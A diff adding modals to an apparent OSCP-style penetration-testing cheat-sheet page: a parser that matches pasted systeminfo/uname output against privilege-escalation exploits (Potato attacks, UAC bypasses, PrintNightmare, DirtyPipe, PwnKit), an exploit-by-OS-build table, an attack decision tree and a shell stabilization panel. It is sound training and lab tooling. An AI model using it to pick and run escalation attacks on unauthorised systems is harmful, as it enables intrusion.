@@ -206,6 +206,116 @@ td code{background:var(--bg4);padding:1px 5px;border-radius:3px;font-size:11.5px
   .pipeline{grid-template-columns:1fr}
 }
 
+/* ── Modals (shared) ─────────────────────────────────────────── */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:1000;display:none;align-items:center;justify-content:center;padding:12px}
+.modal-overlay.open{display:flex}
+.modal{background:var(--bg2);border:1px solid var(--border);border-radius:10px;width:min(980px,96vw);max-height:88vh;display:flex;flex-direction:column;overflow:hidden;animation:modalIn .15s ease}
+@keyframes modalIn{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}
+.modal-header{display:flex;align-items:center;gap:10px;padding:14px 18px;border-bottom:1px solid var(--border);flex-shrink:0}
+.modal-title{font-size:14px;font-weight:700;color:var(--text);flex:1}
+.modal-close{background:none;border:none;color:var(--text3);cursor:pointer;font-size:20px;padding:0 6px;border-radius:4px;line-height:1}
+.modal-close:hover{background:var(--bg3);color:var(--red)}
+.modal-body{overflow-y:auto;padding:16px 18px;flex:1}
+
+/* ── SI Parser ───────────────────────────────────────────────── */
+.si-textarea{width:100%;height:130px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-family:var(--font);font-size:12px;padding:10px;resize:vertical;outline:none;transition:border-color .15s}
+.si-textarea:focus{border-color:var(--cyan)}
+.si-btn{margin:8px 0 14px;padding:8px 20px;background:var(--cyan);color:#000;border:none;border-radius:var(--radius);font-family:var(--font);font-size:13px;font-weight:700;cursor:pointer;transition:opacity .15s}
+.si-btn:hover{opacity:.85}
+.si-placeholder{color:var(--text3);font-size:13px;text-align:center;padding:32px;border:1px dashed var(--border);border-radius:var(--radius)}
+.si-os-header{background:var(--bg3);border-radius:var(--radius);padding:12px 16px;margin-bottom:12px;border-left:3px solid var(--cyan)}
+.si-os-name{font-size:15px;font-weight:700;color:var(--text)}
+.si-build{font-size:13px;color:var(--cyan);margin-top:2px}
+.si-arch{font-size:12px;color:var(--text3)}
+.si-vulns{display:flex;flex-direction:column;gap:8px}
+.si-card{border-radius:var(--radius);padding:10px 14px}
+.si-card.sv-vuln{border-left:3px solid var(--red);background:rgba(248,81,73,.07)}
+.si-card.sv-patched{border-left:3px solid var(--text3);background:var(--bg3);opacity:.55}
+.si-card.sv-check{border-left:3px solid var(--yellow);background:rgba(210,153,34,.07)}
+.si-vtop{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:4px}
+.si-vname{font-weight:700;font-size:13px;color:var(--text)}
+.si-cve{font-size:11px;color:var(--text3)}
+.si-stag{font-size:10px;font-weight:700;padding:2px 6px;border-radius:4px;text-transform:uppercase}
+.si-stag.sc{background:var(--red);color:#fff}.si-stag.sh{background:var(--orange);color:#000}.si-stag.sm{background:var(--yellow);color:#000}
+.si-vstatus{margin-left:auto;font-size:12px;font-weight:700}
+.sv-vuln .si-vstatus{color:var(--red)}.sv-patched .si-vstatus{color:var(--green)}.sv-check .si-vstatus{color:var(--yellow)}
+.si-vdesc{font-size:12px;color:var(--text2);margin-bottom:3px}
+.si-vcond{font-size:11px;color:var(--text3);font-style:italic}
+.si-kbs{margin-top:5px;font-size:11px;display:flex;gap:5px;flex-wrap:wrap;align-items:center}
+.si-kb{padding:2px 6px;border-radius:3px;font-family:var(--font)}
+.si-kb.present{background:rgba(63,185,80,.15);color:var(--green)}.si-kb.missing{background:rgba(248,81,73,.15);color:var(--red)}
+.si-goto{display:inline-block;margin-top:6px;font-size:12px;color:var(--cyan);text-decoration:none}
+.si-goto:hover{text-decoration:underline}
+.si-msg{border-radius:var(--radius);padding:10px 14px;font-size:13px;margin:8px 0}
+.si-msg.ok{color:var(--green);background:rgba(63,185,80,.08);border:1px solid rgba(63,185,80,.2)}
+.si-msg.warn{color:var(--yellow);background:rgba(210,153,34,.08);border:1px solid rgba(210,153,34,.2)}
+
+/* ── OS Compat Table ─────────────────────────────────────────── */
+.compat-filter{width:100%;padding:8px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-family:var(--font);font-size:13px;outline:none;margin-bottom:12px;transition:border-color .15s}
+.compat-filter:focus{border-color:var(--cyan)}
+.compat-wrap{overflow-x:auto}
+.compat-tbl{width:100%;border-collapse:collapse;font-size:12px;white-space:nowrap}
+.compat-tbl th{padding:8px 10px;background:var(--bg3);color:var(--text2);font-size:10px;text-transform:uppercase;letter-spacing:.5px;border-bottom:2px solid var(--border);cursor:pointer;user-select:none;text-align:center}
+.compat-tbl th:first-child,.compat-tbl th:last-child{text-align:left}
+.compat-tbl th:hover{color:var(--cyan)}
+.compat-tbl th.cs{color:var(--cyan)}
+.compat-tbl td{padding:7px 10px;border-bottom:1px solid var(--border);vertical-align:middle;text-align:center}
+.compat-tbl td:first-child,.compat-tbl td:last-child{text-align:left}
+.compat-tbl tr:hover td{background:var(--bg3)}
+.compat-tbl tr.ch{display:none}
+.cn a{color:var(--cyan);text-decoration:none;font-weight:700;font-size:12px}
+.cn a:hover{text-decoration:underline}
+.creq{font-size:11px;color:var(--text3);white-space:normal;min-width:160px;max-width:220px}
+.cy{color:var(--green);font-weight:700}.cx{color:var(--red)}.cc{color:var(--yellow);font-size:11px;font-weight:600}.cna{color:var(--text3)}
+.ctype{font-size:9px;font-weight:700;padding:2px 5px;border-radius:3px;text-transform:uppercase;background:var(--bg4);color:var(--text3)}
+.compat-note{font-size:11px;color:var(--text3);margin-top:8px}
+
+/* ── Decision Tree ───────────────────────────────────────────── */
+.dt-tabs{display:flex;gap:8px;margin-bottom:14px}
+.dt-tab{padding:7px 18px;border:1px solid var(--border);border-radius:var(--radius);background:var(--bg3);color:var(--text2);cursor:pointer;font-family:var(--font);font-size:13px;font-weight:600;transition:all .15s}
+.dt-tab.active{background:var(--cyan);color:#000;border-color:var(--cyan)}
+.dt-node{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:16px 20px}
+.dt-node.fin{border-color:var(--green);background:rgba(63,185,80,.06)}
+.dt-q{font-size:14px;font-weight:700;color:var(--text);margin-bottom:10px;line-height:1.4}
+.dt-ctx{font-size:12px;color:var(--text3);margin-bottom:12px;font-style:italic;font-family:var(--font);background:var(--bg4);padding:5px 10px;border-radius:4px;display:inline-block}
+.dt-opts{display:flex;flex-direction:column;gap:6px;margin-top:8px}
+.dt-opt{padding:9px 14px;border:1px solid var(--border);border-radius:var(--radius);background:var(--bg4);color:var(--text);cursor:pointer;font-family:var(--font);font-size:13px;text-align:left;transition:all .15s;display:flex;align-items:center;justify-content:space-between}
+.dt-opt:hover{border-color:var(--cyan);background:rgba(88,166,255,.1);color:var(--cyan)}
+.dt-opt.go{border-color:rgba(63,185,80,.4);background:rgba(63,185,80,.06);color:var(--green)}
+.dt-opt.go:hover{background:rgba(63,185,80,.14)}
+.dt-back{padding:6px 14px;background:none;border:1px solid var(--border);border-radius:var(--radius);color:var(--text3);cursor:pointer;font-family:var(--font);font-size:12px;margin-bottom:10px;transition:all .15s}
+.dt-back:hover{color:var(--text);border-color:var(--text3)}
+.dt-crumb{font-size:11px;color:var(--text3);margin-bottom:12px;padding:6px 10px;background:var(--bg4);border-radius:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+pre.dt-cmd{background:var(--bg4);border:1px solid var(--border);border-radius:4px;padding:6px 10px;font-family:var(--font);font-size:12px;color:var(--text);margin:4px 0;cursor:pointer;white-space:pre-wrap;word-break:break-all}
+pre.dt-cmd:hover{border-color:var(--green);background:rgba(63,185,80,.06)}
+.dt-sec{display:inline-block;margin-top:8px;font-size:13px;color:var(--cyan);text-decoration:none}
+.dt-sec:hover{text-decoration:underline}
+.dt-cmds{margin-top:10px}
+.dt-cmds-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);margin-bottom:6px}
+
+/* ── Shell Stabilization Float Panel ────────────────────────── */
+#stab-panel{position:fixed;bottom:16px;right:72px;width:344px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;z-index:400;box-shadow:0 8px 32px rgba(0,0,0,.55);transition:box-shadow .2s}
+#stab-hdr{display:flex;align-items:center;gap:8px;padding:10px 14px;cursor:pointer;border-radius:10px;user-select:none}
+#stab-hdr:hover{background:var(--bg3)}
+.stab-icon{font-size:15px}
+.stab-title{font-size:13px;font-weight:700;color:var(--green);flex:1}
+.stab-arr{color:var(--text3);font-size:11px;transition:transform .2s}
+#stab-panel.sc .stab-arr{transform:rotate(180deg)}
+#stab-body{border-top:1px solid var(--border)}
+#stab-panel.sc #stab-body{display:none}
+.stab-tabs{display:flex;border-bottom:1px solid var(--border)}
+.stab-tab{flex:1;padding:7px;text-align:center;cursor:pointer;font-size:12px;font-weight:600;color:var(--text3);border:none;background:none;font-family:var(--font);transition:color .15s}
+.stab-tab.active{color:var(--green);border-bottom:2px solid var(--green)}
+.stab-content{padding:10px 12px;max-height:310px;overflow-y:auto}
+.stab-steps{display:flex;flex-direction:column;gap:7px}
+.stab-step{display:flex;gap:8px;align-items:flex-start}
+.stab-n{width:20px;height:20px;border-radius:50%;background:var(--bg4);border:1px solid var(--border);font-size:10px;font-weight:700;color:var(--text3);display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:3px}
+.stab-sc{flex:1}
+.stab-lbl{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.4px;font-weight:600;margin-bottom:3px}
+pre.stab-cmd{background:var(--bg4);border:1px solid var(--border);border-radius:4px;padding:5px 9px;font-size:11.5px;color:var(--text);margin:2px 0;cursor:pointer;white-space:pre-wrap;word-break:break-all}
+pre.stab-cmd:hover{border-color:var(--green);background:rgba(63,185,80,.07)}
+.stab-note{font-size:11px;color:var(--text3);padding-top:8px;border-top:1px solid var(--border);margin-top:8px;line-height:1.5}
+
 /* ── Auto Transfer Block ────────────────────────────────────── */
 .auto-xfer{background:rgba(88,166,255,.05);border:1px solid rgba(88,166,255,.2);border-radius:var(--radius);margin:10px 0 16px;overflow:hidden}
 .xfer-header{display:flex;align-items:center;justify-content:space-between;padding:7px 12px;cursor:pointer;font-size:11px;font-weight:700;color:var(--cyan);letter-spacing:.3px;text-transform:uppercase;user-select:none}
@@ -232,6 +342,10 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
   <button class="topbar-btn" onclick="toggleTheme()" title="Toggle dark/light">&#9790;</button>
   <button class="topbar-btn" onclick="toggleTimer()" title="Exam timer">&#9200;</button>
   <span id="timer">00:00</span>
+  <button class="topbar-btn" onclick="openModal('si-modal')" title="Paste systeminfo/uname → detect vulnerabilities">&#128269; Parse</button>
+  <button class="topbar-btn" onclick="openModal('compat-modal')" title="OS × Exploit compatibility table">&#128202; Compat</button>
+  <button class="topbar-btn" onclick="openModal('dt-modal');dtInit()" title="Interactive privesc decision tree">&#127807; Guide</button>
+  <button class="topbar-btn" id="btn-stab" onclick="toggleStab()" title="Shell stabilization quick-ref">&#128024; Stab</button>
   <button class="topbar-btn" onclick="showHelp()" title="Keyboard shortcuts">&#63;</button>
 </div>
 
@@ -282,6 +396,79 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
   <div class="var-group lin-only-var">
     <span class="var-label">LFILE</span>
     <input class="var-input" id="v-lfile" placeholder="/tmp/shell.sh" style="width:110px" oninput="updateAll()">
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!--  MODAL: SI PARSER                                          -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="modal-overlay" id="si-modal" onclick="overlayClose(event,'si-modal')">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="modal-title">&#128269; System Info Parser — paste output → instant CVE matching</span>
+      <button class="modal-close" onclick="closeModal('si-modal')">&#215;</button>
+    </div>
+    <div class="modal-body">
+      <div class="si-msg warn" style="margin-bottom:10px">Windows: paste full <code>systeminfo</code> output &nbsp;|&nbsp; Linux: paste <code>uname -a</code> or <code>cat /etc/os-release</code> output</div>
+      <textarea class="si-textarea" id="si-input" placeholder="Paste systeminfo or uname -a output here…&#10;&#10;Windows example:&#10;OS Name:     Microsoft Windows Server 2019 Standard&#10;OS Version:  10.0.17763 N/A Build 17763&#10;&#10;Linux example:&#10;Linux target 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 x86_64 GNU/Linux" oninput="siAutoDetect()"></textarea>
+      <button class="si-btn" onclick="parseSI()">&#9989; Analyze</button>
+      <div id="si-output"><div class="si-placeholder">Paste output above and click Analyze — auto-detects Windows vs Linux</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!--  MODAL: OS COMPAT TABLE                                    -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="modal-overlay" id="compat-modal" onclick="overlayClose(event,'compat-modal')">
+  <div class="modal" style="max-width:1100px">
+    <div class="modal-header">
+      <span class="modal-title">&#128202; OS Compatibility Table — Exploit &#215; Windows Build</span>
+      <button class="modal-close" onclick="closeModal('compat-modal')">&#215;</button>
+    </div>
+    <div class="modal-body">
+      <input class="compat-filter" id="compat-filter" type="text" placeholder="&#128269; Filter by exploit name, type, or required condition…" oninput="renderCompat()">
+      <div class="compat-wrap" id="compat-wrap"></div>
+      <div class="compat-note">&#9889; = conditional (extra requirement) &nbsp;|&nbsp; Click exploit name to jump to section &nbsp;|&nbsp; Click header to sort</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!--  MODAL: DECISION TREE                                      -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="modal-overlay" id="dt-modal" onclick="overlayClose(event,'dt-modal')">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="modal-title">&#127807; Privesc Decision Tree — answer the questions, get the attack</span>
+      <button class="modal-close" onclick="closeModal('dt-modal')">&#215;</button>
+    </div>
+    <div class="modal-body">
+      <div class="dt-tabs">
+        <button class="dt-tab active" id="dtt-win" onclick="setDTOS('win')">&#127987; Windows</button>
+        <button class="dt-tab" id="dtt-lin" onclick="setDTOS('lin')">&#128039; Linux</button>
+        <button class="dt-tab" onclick="dtReset()" style="margin-left:auto;border-color:var(--border)">&#8635; Reset</button>
+      </div>
+      <div id="dt-out"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!--  FLOATING PANEL: SHELL STABILIZATION                       -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div id="stab-panel" class="sc">
+  <div id="stab-hdr" onclick="toggleStab()">
+    <span class="stab-icon">&#128024;</span>
+    <span class="stab-title">Shell Stabilization</span>
+    <span class="stab-arr">&#9650;</span>
+  </div>
+  <div id="stab-body">
+    <div class="stab-tabs">
+      <button class="stab-tab active" id="stab-lin-btn" onclick="setStabOS('lin')">&#128039; Linux PTY</button>
+      <button class="stab-tab" id="stab-win-btn" onclick="setStabOS('win')">&#127987; Windows</button>
+    </div>
+    <div class="stab-content" id="stab-out"></div>
   </div>
 </div>
 
@@ -5905,7 +6092,6 @@ function getVars() {
 }
 
 function updateAll() {
-  // Save to localStorage
   ['kali','port','rport','target','user','pass','domain','wpath','lfile'].forEach(k => {
     const el = document.getElementById('v-' + k);
     if (el) localStorage.setItem('v-' + k, el.value);
@@ -5913,6 +6099,7 @@ function updateAll() {
   genShell();
   liveReplace();
   refreshTransferBlocks();
+  renderStab();
 }
 
 // ── Live replace {{VAR}} in ALL command/code elements ─────────
@@ -6229,6 +6416,644 @@ function genShell() {
   };
   const cmd = document.getElementById('shell-cmd');
   if (cmd) cmd.textContent = shells[type] || 'Unknown type';
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  FEATURE: MODAL HELPERS
+// ═══════════════════════════════════════════════════════════════
+function openModal(id) {
+  document.getElementById(id).classList.add('open');
+  if (id === 'compat-modal') renderCompat();
+}
+function closeModal(id) { document.getElementById(id).classList.remove('open'); }
+function overlayClose(e, id) { if (e.target.id === id) closeModal(id); }
+
+// Close all modals on Escape — hook into existing keydown handler
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') {
+    ['si-modal','compat-modal','dt-modal'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.classList.remove('open');
+    });
+  }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  FEATURE 2: SYSTEMINFO / UNAME PARSER
+// ═══════════════════════════════════════════════════════════════
+const WIN_BUILDS_MAP = {
+  7601:'Win7 / Server 2008 R2',9200:'Windows 8 / Server 2012',9600:'Win8.1 / Server 2012 R2',
+  14393:'Win10 1607 / Server 2016',15063:'Win10 1703',16299:'Win10 1709',17134:'Win10 1803',
+  17763:'Win10 1809 / Server 2019',18362:'Win10 1903',18363:'Win10 1909',
+  19041:'Win10 2004',19042:'Win10 20H2',19043:'Win10 21H1',19044:'Win10 21H2',
+  20348:'Windows Server 2022',22000:'Win11 21H2',22621:'Win11 22H2',22631:'Win11 23H2'
+};
+
+const WIN_VULNS = [
+  {name:'GodPotato',type:'token',min:9200,max:22631,sev:'c',section:'win-potatoes',
+   desc:'Universal Potato — SeImpersonate → SYSTEM on any build from Vista to Win11.',
+   cond:'whoami /priv shows SeImpersonate or SeAssignPrimaryToken (enabled OR disabled)'},
+  {name:'PrintSpoofer',type:'token',min:14393,max:22631,sev:'h',section:'win-potatoes',
+   desc:'Named pipe impersonation via Spooler — fails if Spooler stopped.',
+   cond:'SeImpersonate + Print Spooler running: sc query spooler | findstr RUNNING'},
+  {name:'JuicyPotato',type:'token',min:7601,max:17762,sev:'h',section:'win-potatoes',
+   desc:'DCOM NTLM reflection — BROKEN on Server 2019+ / Win10 1809+ (build ≥ 17763).',
+   cond:'SeImpersonate + correct CLSID for target OS + build < 17763'},
+  {name:'SigmaPotato',type:'token',min:18362,max:22631,sev:'h',section:'win-potatoes',
+   desc:'RPC Endpoint Mapper trick — no Print Spooler needed.',
+   cond:'SeImpersonate, build ≥ 18362'},
+  {name:'SweetPotato',type:'token',min:14393,max:22631,sev:'h',section:'win-potatoes',
+   desc:'Combined JuicyPotato+PrintSpoofer — good fallback.',
+   cond:'SeImpersonate'},
+  {name:'fodhelper UAC Bypass',type:'uac',min:14393,max:22631,sev:'m',section:'win-uac',
+   desc:'Registry hijack via ms-settings — no binary required.',
+   cond:'Medium integrity shell + ConsentPromptBehaviorAdmin ≠ 1'},
+  {name:'computerdefaults UAC',type:'uac',min:17763,max:22631,sev:'m',section:'win-uac',
+   desc:'Alternative UAC bypass — works on builds where fodhelper is patched.',
+   cond:'Medium integrity shell'},
+  {name:'AlwaysInstallElevated',type:'policy',min:7601,max:22631,sev:'c',section:'win-aie',
+   desc:'MSI payload runs as SYSTEM when both HKLM+HKCU AIE keys = 1.',
+   cond:'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated → 0x1 in BOTH keys'},
+  {name:'SeBackupPrivilege',type:'token',min:7601,max:22631,sev:'h',section:'win-exploits',
+   desc:'Bypass file ACLs — dump SAM/NTDS directly without admin. Enabled OR disabled = exploitable.',
+   cond:'whoami /priv shows SeBackupPrivilege'},
+  {name:'SeDebugPrivilege',type:'token',min:7601,max:22631,sev:'h',section:'win-exploits',
+   desc:'Inject into SYSTEM processes (winlogon.exe) or dump LSASS.',
+   cond:'whoami /priv shows SeDebugPrivilege'},
+  {name:'SeLoadDriverPrivilege',type:'token',min:7601,max:22631,sev:'h',section:'win-exploits',
+   desc:'Load vulnerable signed driver (Capcom.sys) → SYSTEM via ExploitCapcom.',
+   cond:'whoami /priv shows SeLoadDriverPrivilege'},
+  {name:'PrintNightmare LPE',cve:'CVE-2021-1675',type:'cve',min:14393,max:22000,
+   patchKBs:['KB5004945','KB5004946','KB5004947','KB5004948','KB5004960'],sev:'c',section:'win-exploits',
+   desc:'Print Spooler AddPrinterDriver LPE — July 2021 patch. Spooler must be running.',
+   cond:'Spooler running (sc query spooler) + none of July 2021 patch KBs installed'},
+  {name:'CVE-2023-29360',cve:'CVE-2023-29360',type:'cve',min:19041,max:22631,
+   patchKBs:['KB5027215'],sev:'h',section:'win-exploits',
+   desc:'Kernel LPE — June 2023 patch.',
+   cond:'No KB5027215'},
+  {name:'EternalBlue',cve:'MS17-010',type:'cve',min:7601,max:14393,
+   patchKBs:['KB4012212','KB4012215','KB4012213','KB4012214'],sev:'c',section:'win-exploits',
+   desc:'SMBv1 RCE — should be patched everywhere but still on old OSCP boxes.',
+   cond:'nmap --script smb-vuln-ms17-010 | grep VULNERABLE'},
+];
+
+const LIN_VULNS = [
+  {name:'DirtyPipe',cve:'CVE-2022-0847',minK:[5,8,0],maxK:[5,16,11],sev:'c',section:'lin-kernel',
+   desc:'Pipe splice → overwrite read-only files. SUID binary overwrite → instant root.',
+   check:'Vulnerable: 5.8.0 – 5.16.11 (also some 5.15.x LTS). Check: uname -r'},
+  {name:'DirtyCow',cve:'CVE-2016-5195',minK:[2,6,22],maxK:[4,8,3],sev:'h',section:'lin-kernel',
+   desc:'Race condition in CoW — write to read-only mmap. Stable PoC: dirtycow.ninja',
+   check:'Vulnerable: 2.6.22 – 4.8.3. Check: uname -r'},
+  {name:'PwnKit (polkit)',cve:'CVE-2021-4034',minK:[0,0,0],maxK:[99,99,99],sev:'c',section:'lin-kernel',
+   desc:'pkexec universal LPE — polkit < 0.120 on ALL kernel versions. Not a kernel bug.',
+   check:'dpkg -l policykit-1 | awk "/policykit/{print $3}" — or — rpm -qi polkit | grep Version'},
+  {name:'Baron Samedit (sudo)',cve:'CVE-2021-3156',minK:[0,0,0],maxK:[99,99,99],sev:'c',section:'lin-kernel',
+   desc:'sudo heap overflow — sudo < 1.9.5p2. Works without any sudo rights.',
+   check:'sudo --version | head -1 — vulnerable if < 1.9.5p2'},
+  {name:'Polkit D-Bus Race',cve:'CVE-2021-3560',minK:[0,0,0],maxK:[99,99,99],sev:'h',section:'lin-kernel',
+   desc:'polkit authentication bypass via D-Bus message timing — polkit < 0.119.',
+   check:'Affects: RHEL 8, Fedora 34, Ubuntu 20.04 LTS (specific package versions)'},
+];
+
+let siDebounce = null;
+function siAutoDetect() {
+  clearTimeout(siDebounce);
+  siDebounce = setTimeout(parseSI, 600);
+}
+
+function parseSI() {
+  const raw = document.getElementById('si-input').value.trim();
+  const out = document.getElementById('si-output');
+  if (!raw) { out.innerHTML = '<div class="si-placeholder">Paste output above and click Analyze</div>'; return; }
+  const isLin = /linux\s|\d+\.\d+\.\d+.*#\d+/i.test(raw) && !/windows|microsoft|os name/i.test(raw);
+  isLin ? parseSILinux(raw, out) : parseSIWindows(raw, out);
+}
+
+function parseSIWindows(raw, out) {
+  const osM = raw.match(/OS Name:\s*(.+)/i);
+  const bldM = raw.match(/Build\s+(\d{4,5})/i);
+  const archM = raw.match(/System Type:\s*(.+)/i);
+  const build = bldM ? parseInt(bldM[1]) : null;
+  const kbs = new Set((raw.match(/KB\d{7}/gi) || []).map(k => k.toUpperCase()));
+
+  let html = '<div class="si-os-header">';
+  if (osM) html += `<div class="si-os-name">${escHtml(osM[1].trim())}</div>`;
+  if (build) html += `<div class="si-build">Build ${build} &mdash; ${WIN_BUILDS_MAP[build] || 'Unknown (check nearby builds)'}</div>`;
+  if (archM) html += `<div class="si-arch">${escHtml(archM[1].trim())}</div>`;
+  html += '</div>';
+
+  if (!build) {
+    out.innerHTML = html + '<div class="si-msg warn">&#9888; Could not extract build number. Make sure to paste the full systeminfo output (not just a snippet). Run: <code>systeminfo | findstr /i "Build"</code></div>';
+    return;
+  }
+
+  let vulnN = 0, html2 = '<div class="si-vulns">';
+  WIN_VULNS.forEach(v => {
+    if (v.min > build || v.max < build) return;
+    const patched = v.patchKBs && v.patchKBs.some(kb => kbs.has(kb));
+    const cls = patched ? 'sv-patched' : 'sv-vuln';
+    if (!patched) vulnN++;
+    html2 += `<div class="si-card ${cls}">
+      <div class="si-vtop">
+        <span class="si-vname">${v.name}</span>
+        ${v.cve ? `<span class="si-cve">${v.cve}</span>` : ''}
+        <span class="si-stag s${v.sev}">${v.sev==='c'?'CRITICAL':v.sev==='h'?'HIGH':'MEDIUM'}</span>
+        <span class="si-vstatus">${patched ? '&#10003; PATCHED' : '&#9888; LIKELY VULNERABLE'}</span>
+      </div>
+      <div class="si-vdesc">${v.desc}</div>
+      <div class="si-vcond">Conditions: ${v.cond}</div>
+      ${v.patchKBs ? `<div class="si-kbs">Patch KBs: ${v.patchKBs.map(k=>`<span class="si-kb ${kbs.has(k)?'present':'missing'}">${k}</span>`).join('')}</div>` : ''}
+      ${!patched ? `<a class="si-goto" href="#${v.section}" onclick="closeModal('si-modal')">&#8594; Go to §${v.section}</a>` : ''}
+    </div>`;
+  });
+  html2 += '</div>';
+
+  if (!vulnN && kbs.size === 0) {
+    html2 += '<div class="si-msg warn">&#9888; No hotfixes found in output — the list may be empty. Run: <code>wmic qfe list brief</code> and paste that output too.</div>';
+  } else if (!vulnN) {
+    html2 += '<div class="si-msg ok">&#10003; All checked CVEs appear patched. Focus on token privileges, service misconfigurations, and credential hunting.</div>';
+  }
+  out.innerHTML = html + html2;
+}
+
+function parseSILinux(raw, out) {
+  const km = raw.match(/(\d+)\.(\d+)\.(\d+)/);
+  const k = km ? [+km[1],+km[2],+km[3]] : null;
+  const kstr = k ? k.join('.') : 'unknown';
+  const distroM = raw.match(/(ubuntu|debian|centos|fedora|rhel|kali|arch|alpine|opensuse)/i);
+
+  let html = `<div class="si-os-header"><div class="si-os-name">Linux ${distroM?distroM[1]:''}</div><div class="si-build">Kernel ${kstr}</div></div>`;
+  if (!k) { out.innerHTML = html + '<div class="si-msg warn">&#9888; Could not extract kernel version.</div>'; return; }
+
+  const kv = x => x[0]*1e6+x[1]*1e3+x[2];
+  const kval = kv(k);
+  html += '<div class="si-vulns">';
+  LIN_VULNS.forEach(v => {
+    const inRange = kval >= kv(v.minK) && kval <= kv(v.maxK);
+    const isUniversal = v.minK[0]===0 && v.maxK[0]===99;
+    const cls = isUniversal ? 'sv-check' : inRange ? 'sv-vuln' : 'sv-patched';
+    html += `<div class="si-card ${cls}">
+      <div class="si-vtop">
+        <span class="si-vname">${v.name}</span>
+        <span class="si-cve">${v.cve}</span>
+        <span class="si-stag s${v.sev}">${v.sev==='c'?'CRITICAL':'HIGH'}</span>
+        <span class="si-vstatus">${cls==='sv-vuln'?'&#9888; LIKELY VULNERABLE':cls==='sv-check'?'&#9889; CHECK MANUALLY':'&#10003; OUT OF RANGE'}</span>
+      </div>
+      <div class="si-vdesc">${v.desc}</div>
+      <div class="si-vcond">${v.check}</div>
+      <a class="si-goto" href="#${v.section}" onclick="closeModal('si-modal')">&#8594; Go to section</a>
+    </div>`;
+  });
+  html += '</div>';
+  out.innerHTML = html;
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  FEATURE 3: OS COMPATIBILITY TABLE
+// ═══════════════════════════════════════════════════════════════
+const COMPAT = [
+  // name, section, type, req, [Win7/2008R2, Srv2012R2, Win10 1607/Srv2016, Win10 1809/Srv2019, Win10 21H2, Srv2022, Win11]
+  {n:'GodPotato',s:'win-potatoes',t:'token',r:'SeImpersonate / SeAssignPrimaryToken',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'PrintSpoofer',s:'win-potatoes',t:'token',r:'SeImpersonate + Spooler running',c:['✗','✗','✓','✓','✓','⚡','⚡']},
+  {n:'JuicyPotato',s:'win-potatoes',t:'token',r:'SeImpersonate + CLSID for target',c:['✓','✓','✓','✗','✗','✗','✗']},
+  {n:'SweetPotato',s:'win-potatoes',t:'token',r:'SeImpersonate',c:['✗','✗','✓','✓','✓','⚡','⚡']},
+  {n:'SigmaPotato',s:'win-potatoes',t:'token',r:'SeImpersonate, no Spooler needed',c:['✗','✗','✗','✗','✓','✓','✓']},
+  {n:'RoguePotato',s:'win-potatoes',t:'token',r:'SeImpersonate + Kali port forward',c:['✗','✗','✗','✓','✓','⚡','⚡']},
+  {n:'LocalPotato',s:'win-potatoes',t:'token',r:'SeImpersonate',c:['✗','✗','⚡','✓','✓','✓','✓']},
+  {n:'churrasco',s:'win-potatoes',t:'token',r:'SeImpersonate (XP/2003 only)',c:['⚡','✗','✗','✗','✗','✗','✗']},
+  {n:'fodhelper UAC',s:'win-uac',t:'uac',r:'Medium integrity, ConsentPrompt≠1',c:['✗','✗','✓','✓','✓','✓','✓']},
+  {n:'eventvwr UAC',s:'win-uac',t:'uac',r:'Medium integrity',c:['⚡','⚡','✓','⚡','✗','✗','✗']},
+  {n:'computerdefaults UAC',s:'win-uac',t:'uac',r:'Medium integrity',c:['✗','✗','✗','✓','✓','✓','✓']},
+  {n:'sdclt UAC',s:'win-uac',t:'uac',r:'Medium integrity',c:['✗','✗','✗','✓','⚡','⚡','✗']},
+  {n:'AlwaysInstallElevated',s:'win-aie',t:'policy',r:'HKLM+HKCU AIE keys both = 0x1',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'Service Bin Hijack',s:'win-svcbin',t:'svc',r:'Write to .exe + can restart',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'Unquoted Svc Path',s:'win-uqpath',t:'svc',r:'Writable dir in path + restart',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'Weak Reg DACL',s:'win-regdacl',t:'svc',r:'Write to service ImagePath key',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'Sched Task Binary',s:'win-schtask',t:'svc',r:'Writable task .exe + triggers',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'SeBackupPrivilege',s:'win-exploits',t:'token',r:'SeBackupPrivilege (any state)',c:['✓','✓','✓','✓','✓','✓','✓']},
